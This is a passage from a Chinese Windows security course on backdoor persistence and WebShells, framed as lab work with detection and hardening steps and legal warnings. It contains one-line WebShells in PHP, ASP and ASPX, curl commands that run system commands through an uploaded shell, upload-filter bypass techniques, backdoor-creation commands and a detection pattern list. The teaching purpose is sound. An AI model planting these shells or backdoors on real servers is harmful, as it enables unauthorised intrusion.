if (Test-Path "C:\Windows\System32\sethc.exe.bak") {
    Copy-Item "C:\Windows\System32\sethc.exe.bak" "C:\Windows\System32\sethc.exe" -Force
    icacls "C:\Windows\System32\sethc.exe" /reset
    Write-Host "sethc.exe 已恢复" -ForegroundColor Green
}

# 5. 清除WMI事件订阅
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
Write-Host "WMI事件订阅已清除" -ForegroundColor Green

# 6. 删除恶意文件
Remove-Item "C:\Windows\Temp\backdoor*" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\malware*" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\svchost_update*" -Force -ErrorAction SilentlyContinue

Write-Host "`n后门清除完成！请重新运行检测脚本验证。" -ForegroundColor Green
```

---

### 各类持久化技术对比总结

| 技术 | 触发方式 | 权限级别 | 检测难度 | 持久性 | 检测方法 |
| --- | --- | --- | --- | --- | --- |
| 注册表Run键 | 用户登录 | 当前用户 | ⭐⭐ | 高 | 注册表扫描 |
| 计划任务 | 定时/启动/登录 | 可配置SYSTEM | ⭐⭐ | 高 | `Get-ScheduledTask` |
| 系统服务 | 系统启动 | SYSTEM | ⭐⭐ | 非常高 | `Get-Service` |
| WMI事件订阅 | 事件触发 | SYSTEM | ⭐⭐⭐⭐ | 非常高 | WMI命名空间查询 |
| DLL劫持 | 程序启动 | 继承父进程 | ⭐⭐⭐ | 高 | Process Monitor |
| 粘滞键替换 | 登录界面按键 | SYSTEM | ⭐ | 中 | 文件哈希对比 |
| WinRM后门 | 网络连接 | SYSTEM | ⭐⭐⭐ | 高 | 网络连接监控 |

---

## 📝 任务一知识点总结

> **一句话**：任务一从攻击者视角理解Windows后门技术——注册表、计划任务、服务、WMI、粘滞键等持久化手段，以及如何系统化地检测和清除这些后门。"知攻"才能"善防"。

| 知识点 | 要点 |
| --- | --- |
| 后门的本质 | 绕过正常认证的秘密访问通道，核心目的是**持久化** |
| 注册表后门 | Run键在用户登录时自动执行，最容易检测也最容易实现 |
| 服务后门 | 以SYSTEM权限开机自运行，通过`sc`命令创建，需重点排查非标准服务 |
| 计划任务后门 | 灵活的触发机制（定时/启动/登录/事件），使用`Get-ScheduledTask`检测 |
| WMI后门 | 最高级的持久化技术，无文件落地，极难检测，需查询WMI命名空间 |
| 粘滞键后门 | 利用登录界面辅助功能，替换System32下的关键程序 |
| 检测原则 | 多维度排查——注册表+服务+计划任务+WMI+网络连接+进程+文件哈希 |
| 防御原则 | 最小权限+应用白名单+EDR+日志审计+定期安全扫描 |

---

# 任务二 WebShell上传和连接

## 🧠 理论知识

### 木马（Trojan）的分类

**木马**是一类伪装成合法软件、以欺骗用户安装的恶意程序。木马（Trojan Horse）的名字来源于古希腊特洛伊木马的故事——外表是礼物，内部藏有士兵。

| 类型 | 说明 | 典型代表 |
| --- | --- | --- |
| **远控木马（RAT）** | 全功能远程控制，屏幕监控、文件管理、命令执行 | Cobalt Strike、Metasploit、Gh0st |
| **信息窃取木马（Stealer）** | 窃取浏览器密码、Cookie、加密货币钱包 | RedLine、Raccoon |
| **键盘记录器（Keylogger）** | 记录键盘输入，获取账号密码 | 软件型/硬件型 |
| **后门木马（Backdoor）** | 维持对系统的持久访问 | 与任务一的后门技术配合使用 |
| **下载者（Downloader）** | 体积小，功能仅为下载并执行其他恶意软件 | 常作为攻击链的第一阶段 |
| **勒索木马（Ransomware）** | 加密文件勒索赎金 | WannaCry、LockBit |
| **挖矿木马（Cryptominer）** | 占用系统资源进行加密货币挖矿 | 常见于服务器入侵后 |

---

### WebShell深度解析

#### 什么是WebShell？

**WebShell** 是以网页脚本形式存在于Web服务器上的恶意程序。攻击者通过浏览器向WebShell发送HTTP请求，WebShell接收参数并在服务器上执行，将结果通过HTTP响应返回给攻击者。

```
WebShell的工作原理：

攻击者浏览器
    │
    │  HTTP POST请求
    │  URL: http://target/uploads/shell.php
    │  Body: cmd=whoami
    │
    ▼
Web服务器（IIS/Apache/Nginx）
    │
    │  解析PHP/ASP/ASPX脚本
    │
    ▼
WebShell脚本执行
    │
    │  @eval($_POST['cmd'])
    │  → 执行系统命令: whoami
    │
    ▼
返回命令执行结果（HTML格式）

    │  HTTP 200 响应
    │  Body: <pre>nt authority\iusr</pre>
    │
    ▼
攻击者浏览器显示结果
```

#### WebShell的分类详解

| 类型 | 代码量 | 功能 | 用途 | 检测难度 |
| --- | --- | --- | --- | --- |
| **小马** | 5-20行 | 仅文件上传功能 | 先上传小马，再通过小马上传大马 | ⭐⭐（中） |
| **大马** | 数百-数千行 | 文件管理、命令执行、数据库操作、端口扫描 | 完整的远程管理工具 | ⭐（易，体积大） |
| **一句话木马** | 1-3行 | 通过eval执行任意代码，配合客户端工具使用 | 最常见的WebShell形式 | ⭐⭐⭐（难，代码极短） |

**各语言一句话木马示例**：

```php
<!-- PHP 一句话木马 -->
<?php @eval($_POST['cmd']);?>
<!-- @符号抑制错误信息输出 -->
<!-- $_POST['cmd'] 接收POST参数cmd的值 -->
<!-- eval() 将字符串作为PHP代码执行 -->
```

```asp
<!-- ASP 一句话木马 -->
<%execute(request("cmd"))%>
<!-- request("cmd") 接收请求参数cmd -->
<!-- execute() 将字符串作为VBScript代码执行 -->
```

```aspx
<!-- ASPX 一句话木马（Jscript版） -->
<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>
```

> 💡 **eval函数是关键**：所有一句话木马的核心都是`eval`类函数——它将字符串当作代码执行。攻击者通过POST参数传递要执行的命令，WebShell在服务器端eval执行后返回结果。

#### WebShell管理工具

| 工具 | 通信方式 | 特点 | 检测难度 |
| --- | --- | --- | --- |
| **中国菜刀（China Chopper）** | 明文POST | 经典工具，特征明显，已被杀软广泛识别 | ⭐（易） |
| **冰蝎（Behinder）** | AES加密通信 | 流量加密，每次连接密钥随机，绕过IDS/WAF | ⭐⭐⭐（难） |
| **哥斯拉（Godzilla）** | 自定义加密算法 | 支持多种加密方式，高度可定制 | ⭐⭐⭐⭐（很难） |
| **蚁剑（AntSword）** | 明文/加密 | 开源，插件丰富，社区活跃 | ⭐⭐（中） |
| **Weevely** | 加密通信 | Python编写，Kali内置，针对PHP | ⭐⭐⭐（难） |

**菜刀连接WebShell的通信过程**（以PHP一句话木马为例）：

```
中国菜刀 → 目标服务器

POST /uploads/shell.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

cmd=@eval(base64_decode($_POST[action]));&action=ZWNobyAiSGVsbG8iOw==

响应:
HTTP/1.1 200 OK
Hello
```

> 🔍 **检测线索**：菜刀的POST请求体特征明显（包含`eval`、`base64_decode`等关键字），WAF和IDS可以通过这些特征进行检测。但冰蝎和哥斯拉使用加密通信，传统特征检测失效，需要基于流量行为分析（如请求/响应大小异常、固定周期通信等）。

---

### 文件上传漏洞利用链

文件上传漏洞是WebShell部署的最主要途径。以下是从发现漏洞到获取服务器控制权的完整利用链：

```
文件上传漏洞利用链：

┌─────────────────────────────────────────────────────────┐
│ 第一阶段：发现上传点                                      │
│ • 目录扫描发现 upload.php、admin/upload.html 等           │
│ • 查看前端源码中的文件上传表单                             │
│ • 测试API接口的文件上传功能                                │
└───────────────────────┬─────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│ 第二阶段：绕过前端验证                                    │
│ • 删除JavaScript验证代码（浏览器F12）                     │
│ • 禁用JavaScript                                         │
│ • 使用Burp Suite拦截并修改请求                            │
│ • 直接构造POST请求，跳过前端                              │
└───────────────────────┬─────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│ 第三阶段：绕过后端验证                                    │
│                                                         │
│ Content-Type验证    → 修改Content-Type为image/jpeg       │
│ 扩展名黑名单        → 使用.php5、.phtml、.asa等           │
│ 扩展名大小写        → .PhP、.pHp（部分系统区分大小写）    │
│ 双写绕过            → .pphphp → 去除中间php后变.php      │
│ 00截断              → shell.php%00.jpg（老版本PHP）       │
│ 图片马              → 在图片文件中嵌入PHP代码              │
│ .htaccess覆盖       → 上传.htaccess修改解析规则           │
│ 竞争条件            → 在文件被删除前快速访问执行           │
│ IIS解析漏洞         → shell.asp;.jpg（IIS6.0特性）       │
└───────────────────────┬─────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────┐
│ 第四阶段：利用WebShell                                    │
│ • 访问上传后的WebShell URL                                │
│ • 使用菜刀/冰蝎/哥斯拉连接                                │
│ • 执行系统命令、管理文件、连接数据库                       │
│ • 提权、横向移动、数据窃取                                │
└─────────────────────────────────────────────────────────┘
```

**后端验证绕过方式对照表**：

| 验证方式 | 绕过方法 | 原理 |
| --- | --- | --- |
| Content-Type检查 | 修改为`image/jpeg` | 只检查MIME类型，不检查文件内容 |
| 文件扩展名黑名单 | 使用`php5`、`phtml`、`asa` | 黑名单不完整，遗漏了可执行扩展名 |
| 扩展名大小写 | `.PhP`、`.Php` | Windows不区分大小写，Linux区分 |
| 文件头检查（图片马） | 在GIF89a头后嵌入PHP代码 | 检查文件头字节但不检查全部内容 |
| 重命名上传文件 | 双写绕过、00截断 | 过滤逻辑存在缺陷 |

---

### WebShell检测与防御

#### WebShell的检测方法

| 方法 | 工具/技术 | 说明 |
| --- | --- | --- |
| **文件特征扫描** | D盾、河马WebShell查杀、ClamAV | 基于代码特征（eval、base64等关键字）匹配 |
| **文件哈希比对** | MD5/SHA256校验 | 与已知WebShell哈希数据库对比 |
| **文件内容分析** | 人工审查+自动化脚本 | 分析文件中的高风险函数调用 |
| **流量分析** | WAF、IDS/IPS | 检测异常HTTP请求模式（如固定POST到.aspx） |
| **行为检测** | EDR、RASP | 监控Web进程的异常行为（如cmd.exe子进程） |
| **文件完整性监控** | FIM工具 | 监控Web目录文件变更 |

#### WebShell防御体系

```
WebShell防御四层体系：

第一层：预防（事前）
├── 上传目录禁止脚本执行权限（最关键！）
├── 文件上传白名单验证（仅允许图片/文档等安全类型）
├── 上传文件重命名（随机化文件名）
├── 限制上传文件大小
└── Content-Type + 文件头 + 扩展名多重验证

第二层：检测（事中）
├── WAF实时检测异常请求
├── RASP监控Web进程行为
└── IDS/IPS检测已知WebShell通信特征

第三层：响应（事后）
├── 定期扫描Web目录（D盾/河马）
├── 文件完整性监控（新文件告警）
├── 分析Web访问日志（异常POST请求）
└── 分析系统日志（Web进程启动cmd等异常）

第四层：恢复
├── 清除WebShell文件
├── 修复上传漏洞
├── 审查后门和持久化
└── 加固Web服务器配置
```

---

## 🛠️ 实践操作

### 实验8：安装phpStudy并配置Upload-Labs靶场

**phpStudy** 是集成了Apache/Nginx + PHP + MySQL的Windows集成环境，适合快速搭建PHP运行环境用于安全实验。

**操作步骤**：

**第一步：安装phpStudy**

1. 下载phpStudy 2018版本（内置PHP 5.x，便于复现经典漏洞）
2. 安装后启动Apache和MySQL服务
3. 验证：浏览器访问 `http://localhost/`，显示phpStudy默认页面

**第二步：部署Upload-Labs靶场**

```powershell
# 将Upload-Labs解压到网站根目录
# 目标路径：C:\phpstudy_pro\WWW\upload-labs\
# 或 C:\phpstudy\WWW\upload-labs\

# 验证：浏览器访问
# http://localhost/upload-labs/
```

**第三步：选择关卡练习**

Upload-Labs包含21个不同难度的关卡，涵盖所有常见的文件上传验证绕过技术：

| 关卡 | 验证类型 | 绕过方法 |
| --- | --- | --- |
| Pass-01 | 前端JavaScript验证 | 禁用JS或Burp Suite拦截修改 |
| Pass-02 | Content-Type验证 | 修改Content-Type为image/jpeg |
| Pass-03 | 扩展名黑名单（不完整） | 使用.php5、.phtml等 |
| Pass-04 | .htaccess覆盖 | 上传.htaccess文件 |
| Pass-05 | 大小写绕过 | 使用.PhP扩展名 |
| Pass-06 | 空格绕过 | 文件名末尾加空格 |
| Pass-07 | 点号绕过 | 文件名末尾加点 |
| Pass-08 | ::$DATA绕过 | Windows NTFS特性 |
| Pass-09 | 点+空格组合绕过 | 多次组合 |
| Pass-10 | 双写绕过 | `.pphphp` |
| Pass-11-12 | 00截断 | `%00`截断（GET/POST） |
| Pass-13-16 | 文件头/图片马 | 图片文件嵌入PHP代码 |
| Pass-17-21 | 条件竞争等高级技术 | race condition |

---

### 实验9：上传WebShell（以Pass-01为例）

**场景**：Pass-01使用前端JavaScript验证，仅允许上传图片文件。我们需要绕过这个限制上传PHP一句话木马。

**操作步骤**：

**第一步：准备一句话木马**

```php
// 保存为 shell.php
<?php @eval($_POST['cmd']);?>
```

**第二步：使用Burp Suite绕过前端验证**

1. 准备一句话木马文件 `shell.php`
2. 浏览器设置代理为 `127.0.0.1:8080`（Burp Suite默认监听端口）
3. 在Burp Suite中开启拦截（Intercept is on）
4. 在Upload-Labs Pass-01页面选择 `shell.php` 并上传
5. Burp Suite拦截请求，将文件名从 `shell.jpg` 改回 `shell.php`
6. 转发请求
7. 服务器接受并保存 `shell.php`

**第三步：验证WebShell上传成功**

```bash
# 访问WebShell
curl http://localhost/upload-labs/upload/shell.php

# 如果返回空白页面（无报错），说明PHP代码已成功执行
# 通过POST参数执行命令
curl -d "cmd=system('whoami');" http://localhost/upload-labs/upload/shell.php
curl -d "cmd=system('ipconfig');" http://localhost/upload-labs/upload/shell.php
curl -d "cmd=system('net user');" http://localhost/upload-labs/upload/shell.php
```

> 💡 **前端验证为什么不安全？** 因为前端JavaScript运行在用户的浏览器中，用户完全可以绕过、修改或禁用前端代码。所有安全验证**必须在服务器端重复执行**。前端验证只是提升用户体验（快速提示），不能作为安全防线。

---

### 实验10：利用WebShell管理工具连接

#### 使用"中国菜刀"连接WebShell

1. 下载并打开中国菜刀（China Chopper）
2. 右键空白区域 → **添加**
3. 填写配置：
    - **地址**：`http://192.168.100.20/upload-labs/upload/shell.php`
    - **密码**：`cmd`（一句话木马中的POST参数名）
    - **类型**：`PHP`
4. 点击确定
5. 双击新添加的条目 → 连接成功
6. 可进行：文件管理、虚拟终端、数据库管理等操作

#### 使用"冰蝎"连接WebShell（加密通信）

1. 冰蝎需要配合专用的服务端WebShell（自带加密通信功能）
2. 服务端WebShell需要在上传前配置连接密码
3. 客户端添加目标 → 输入URL和密码 → 连接
4. 通信全程加密，WAF和IDS无法通过特征匹配检测

> 🔍 **检测冰蝎的思路**：虽然内容加密，但可以检测**流量行为特征**——如请求大小固定模式、通信周期规律、POST到动态脚本的频率异常等。基于AI的流量分析工具可以识别这些模式。

---

### 实验11：WebShell检测与防御加固

#### 方法一：使用PowerShell脚本检测WebShell

```powershell
# ============================================
# WebShell检测脚本
# 扫描Web目录中的可疑文件
# ============================================

$webRoot = "C:\inetpub\wwwroot"
$suspiciousPatterns = @(
    'eval\s*\(',
    'base64_decode\s*\(',
    'system\s*\(',
    'exec\s*\(',
    'passthru\s*\(',
    'shell_exec\s*\(',
    'assert\s*\(',
    'preg_replace.*\/e',
    'call_user_func',
    '\$\{.*\$\{',              # PHP变量变量名
    'WScript\.Shell',          # ASP/ASPX
    'Execute\s*\(',            # ASP
    'Response\.Write.*Exec',   # ASPX
    'cmd\.exe',
    'powershell'
)

Write-Host "`n========== WebShell扫描报告 ==========" -ForegroundColor Cyan
Write-Host "扫描目录: $webRoot"
Write-Host "扫描时间: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

$results = @()
Get-ChildItem -Path $webRoot -Recurse -Include *.php,*.asp,*.aspx,*.jsp -ErrorAction SilentlyContinue | ForEach-Object {
    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
    if ($content) {
        foreach ($pattern in $suspiciousPatterns) {
            if ($content -match $pattern) {
                $results += [PSCustomObject]@{
                    FilePath = $_.FullName
                    Pattern = $pattern
                    LastModified = $_.LastWriteTime
                }
                break
            }
        }
    }
}

if ($results.Count -gt 0) {
    Write-Host "`n[警告] 发现 $($results.Count) 个可疑文件:" -ForegroundColor Red
    $results | Format-Table -AutoSize
} else {
    Write-Host "`n[通过] 未发现可疑文件" -ForegroundColor Green
}
```

#### 方法二：IIS安全加固防止WebShell

```powershell
# ============================================
# IIS上传目录安全加固
# 核心原则：上传目录禁止脚本执行
# ============================================

# 1. 上传目录禁止脚本执行权限
# 在IIS管理器中操作：
# 网站 → uploads目录 → 处理程序映射 → 编辑功能权限 → 取消"脚本"勾选

# 通过PowerShell操作：
Import-Module WebAdministration
Set-WebConfigurationProperty -Filter "/system.webServer/handlers" `
    -PSPath "IIS:\Sites\Default Web Site\upload-labs\upload" `
    -Name "accessPolicy" -Value "Read"

# 2. 配置请求筛选，拒绝上传目录执行脚本
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath "IIS:\Sites\Default Web Site\upload-labs\upload" `
    -Name "." -Value @{fileExtension=".php";allowed="false"}

Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath "IIS:\Sites\Default Web Site\upload-labs\upload" `
    -Name "." -Value @{fileExtension=".asp";allowed="false"}

# 3. 限制上传文件大小（最大1MB）
Set-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/requestLimits" `
    -PSPath "IIS:\Sites\Default Web Site" `
    -Name "maxAllowedContentLength" -Value 1048576

# 4. 通过NTFS权限限制上传目录
$uploadPath = "C:\inetpub\wwwroot\upload-labs\upload"
$acl = Get-Acl $uploadPath
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "IIS_IUSRS", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl $uploadPath $acl
```

**Web安全加固Web.config模板**：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <!-- 上传目录配置：禁止脚本执行 -->
    <handlers accessPolicy="Read">
      <!-- 移除所有脚本处理程序，仅保留静态文件读取 -->
      <remove name="PHP_via_FastCGI" />
      <remove name="ASPClassic" />
      <remove name="PageHandlerFactory-Integrated" />
    </handlers>

    <!-- 请求筛选 -->
    <security>
      <requestFiltering>
        <!-- 限制上传文件大小 1MB -->
        <requestLimits maxAllowedContentLength="1048576" />
        <!-- 拒绝危险扩展名 -->
        <fileExtensions allowUnlisted="true">
          <add fileExtension=".config" allowed="false" />
          <add fileExtension=".exe" allowed="false" />
          <add fileExtension=".bat" allowed="false" />
          <add fileExtension=".cmd" allowed="false" />
          <add fileExtension=".ps1" allowed="false" />
        </fileExtensions>
      </requestFiltering>
    </security>

    <!-- 安全响应头 -->
    <httpProtocol>
      <customHeaders>
        <remove name="X-Powered-By" />
        <add name="X-Frame-Options" value="SAMEORIGIN" />
        <add name="X-Content-Type-Options" value="nosniff" />
      </customHeaders>
    </httpProtocol>

    <!-- 禁用目录浏览 -->
    <directoryBrowse enabled="false" />

    <!-- 自定义错误页 -->
    <httpErrors errorMode="DetailedLocalOnly" existingResponse="Replace">
      <remove statusCode="404" />
      <error statusCode="404" path="/errors/404.html" responseMode="ExecuteURL" />
    </httpErrors>
  </system.webServer>
</configuration>
```

---

## 📝 任务二知识点总结

> **一句话**：任务二从WebShell的角度理解Web应用层面的安全威胁——木马的分类、WebShell的工作原理、文件上传漏洞利用链、以及如何从检测和防护两个维度应对WebShell威胁。

| 知识点 | 要点 |
| --- | --- |
| WebShell本质 | 以Web脚本形式存在的恶意程序，通过HTTP请求远程控制服务器 |
| 一句话木马核心 | `eval`类函数将字符串作为代码执行，是所有一句话木马的关键 |
| 文件上传利用链 | 发现上传点→绕过前端→绕过后端→上传WebShell→远程控制 |
| 前端验证不安全 | JavaScript运行在客户端，可被绕过/禁用，安全验证必须在服务端 |
| 上传目录防护 | **禁止脚本执行权限**是最有效的WebShell防护手段 |
| 现代WebShell工具 | 冰蝎/哥斯拉使用加密通信，传统特征检测失效，需要流量行为分析 |
| 检测方法 | 文件特征扫描+文件哈希比对+流量分析+行为检测+完整性监控 |
| 防御体系 | 预防（白名单+权限）→ 检测（WAF+RASP）→ 响应（扫描+日志）→ 恢复（清除+加固） |

---

# 📚 项目七知识点总结

## 核心操作速查表

| 操作 | 命令/方法 |
| --- | --- |
| 创建服务后门 | `sc create "服务名" binpath="路径" start=auto` |
| 检测可疑服务 | `Get-WmiObject Win32_Service \| Where-Object {$_.PathName -notlike "*System32*"}` |
| 删除服务后门 | `sc stop "服务名"` → `sc delete "服务名"` |
| 创建注册表后门 | `reg add "HKLM\...\Run" /v "键名" /d "程序路径"` |
| 检测注册表后门 | `Get-ItemProperty "HKLM:\...\Run"` |
| 创建计划任务后门 | `schtasks /create /tn "任务名" /tr "程序路径" /sc onstart /ru SYSTEM` |
| 检测计划任务 | `Get-ScheduledTask \| Where-Object {$_.Author -notlike "Microsoft*"}` |
| 检测WMI后门 | `Get-WmiObject -Namespace "root\subscription" -Class __EventFilter` |
| 检查文件篡改 | `Get-FileHash 文件路径 -Algorithm SHA256` |
| 检查网络连接 | `Get-NetTCPConnection -State Established` |
| 检查可疑进程 | `Get-Process \| Where-Object {$_.Path -like "*Temp*"}` |
| 上传目录禁止执行 | IIS管理器 → 目录 → 处理程序映射 → 取消"脚本"权限 |
| WebShell扫描 | D盾、河马WebShell查杀、自定义PowerShell脚本 |

## 常见错误排查表

| 问题 | 可能原因 | 解决方法 |
| --- | --- | --- |
| 粘滞键后门不生效 | 系统文件保护阻止替换 | 需要已有SYSTEM权限或WinPE环境操作 |
| 计划任务不执行 | 任务创建但路径不存在 | 确认恶意程序路径正确且文件存在 |
| WebShell上传成功但无法访问 | IIS未配置PHP解析 | 安装PHP模块或使用ASPX木马替代 |
| WebShell上传后返回403 | 上传目录有执行权限限制 | 这正是防御措施！说明安全加固有效 |
| WMI后门删除后仍触发 | 缓存问题 | 重启WMI服务：`Restart-Service WinRM` |
| Meterpreter会话断开 | 木马进程被杀或网络中断 | 使用`migrate`迁移到合法进程；使用`persistence`安装持久化后门 |

---

## 安全意识

### 攻防对抗思维

> **核心理念**：安全防御不是"装了杀软就安全"，而是"层层设防、纵深防御"。本项目从攻击者视角揭示了后门和WebShell的实现方式，目的是让同学们理解——只有深入理解攻击技术，才能建立真正有效的防御体系。

### 企业环境防御最佳实践

| 防御层次 | 措施 | 对应威胁 |
| --- | --- | --- |
| **终端防护** | 部署EDR（端点检测与响应），不依赖传统特征码杀毒 | 反弹木马、免杀后门 |
| **应用防护** | 上传目录禁止执行、WAF检测异常请求、RASP运行时保护 | WebShell上传和利用 |
| **系统加固** | 最小权限原则、定期安全扫描、文件完整性监控 | 注册表/服务/计划任务后门 |
| **网络防护** | IDS/IPS、流量行为分析、出站流量控制 | 加密WebShell通信、反弹连接 |
| **日志审计** | 集中日志收集（SIEM）、异常行为告警 | WMI后门、隐蔽持久化 |
| **应急响应** | 制定应急响应预案、定期演练、后门排查清单 | 后门检测与清除 |
| **安全意识** | 定期安全培训、钓鱼邮件演练、合规操作教育 | 社会工程学攻击 |

### 免责与法律意识

> **法律红线**：在中国，《网络安全法》《刑法》第285条（非法侵入计算机信息系统罪）和第286条（破坏计算机信息系统罪）明确规定，未经授权对计算机信息系统实施渗透测试、植入后门、上传WebShell等行为属于违法犯罪，最高可处七年有期徒刑。
>
> **合法授权是底线**：即使是安全研究人员，也必须在取得书面授权后才能进行渗透测试。教学实验环境（如虚拟机靶场）是学习这些技术的唯一合法场景。

---

## 课堂思考

1. **后门检测**：为什么说WMI事件订阅后门比注册表后门更难检测？如果你是安全运维人员，会如何建立WMI后门的定期排查机制？

2. **WebShell防护**：在项目四中，我们学习了IIS的"请求筛选"可以拒绝特定文件扩展名。结合本项目学到的WebShell知识，为什么"上传目录禁止脚本执行权限"比"请求筛选拒绝.php扩展名"更有效？

3. **攻防对抗**：传统杀毒软件为什么难以检测冰蝎（Behinder）等加密WebShell？现代EDR相比传统杀软有哪些改进？

4. **应急响应**：假设你是一台Windows服务器的安全管理员，发现服务器CPU占用异常高、存在未知的对外网络连接。请列出你的排查步骤和应急处理流程。

5. **纵深防御**：本项目学到了多种后门技术和WebShell利用方法。如果要为一台面向公网的IIS Web服务器设计完整的安全防护方案，你会包含哪些措施？请按优先级排序。

---

## 知识关联

本项目与前面项目的关联：

| 关联项目 | 关联内容 |
| --- | --- |
| **项目四·IIS网站管理** | WebShell利用的是IIS Web服务。项目四的安全加固措施（请求筛选、权限控制、日志审计）是防御WebShell的第一道防线 |
| **项目四·上传目录权限** | "上传目录禁止脚本执行权限"是防御WebShell最有效的单一措施，直接对应项目四中NTFS权限配置的知识 |
| **项目五·远程桌面管理** | WinRM端口复用后门利用了Windows远程管理服务；RDP安全配置不当可能成为攻击入口 |
| **项目六·域管理** | 域控制器被攻陷后，攻击者可以通过GPO批量部署后门，影响全域计算机。保护DC就是保护整个域的安全 |
| **项目四·纵深防御** | 本项目的后门检测和WebShell防御完全遵循纵深防御思想——不依赖单一手段，多层防护相互补充 |

### MITRE ATT&CK框架对应

本项目涉及的攻击技术在MITRE ATT&CK框架中的映射：

| 本项目技术 | ATT&CK战术 | ATT&CK技术ID |
| --- | --- | --- |
| 注册表Run键后门 | 持久化（Persistence） | T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys |
| 计划任务后门 | 持久化（Persistence） | T1053.005 - Scheduled Task |
| 服务后门 | 持久化（Persistence） | T1543.003 - Windows Service |
| WMI事件订阅 | 持久化（Persistence） | T1546.003 - Windows Management Instrumentation Event Subscription |
| DLL劫持 | 持久化/权限提升 | T1574.001 - DLL Search Order Hijacking |
| 粘滞键后门 | 持久化/防御规避 | T1546.008 - Accessibility Features |
| WebShell | 持久化/初始访问 | T1505.003 - Server Software Component: Web Shell |
| 反弹Shell | 命令与控制 | T1059.001 - PowerShell / T1059.003 - Windows Command Shell |
